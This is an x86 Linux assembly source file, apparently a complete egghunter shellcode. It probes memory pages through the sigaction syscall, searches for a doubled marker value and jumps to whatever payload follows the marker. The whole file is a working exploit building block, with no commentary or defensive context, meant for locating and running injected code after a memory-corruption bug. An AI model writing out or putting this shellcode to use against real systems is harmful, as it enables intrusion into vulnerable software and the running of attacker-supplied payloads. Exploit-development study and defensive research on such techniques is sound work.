global _start

section .text

_start:

	xor ecx, ecx

pgalgn:

	or cx, 0xfff

next:

	inc ecx

	push byte +0x43

	pop eax
	int 0x80

	cmp al, 0xf2

	jz pgalgn

	mov eax, 0x50905090
	mov edi, ecx
	scasd

	jnz next

	scasd
	
	jnz next

	jmp edi
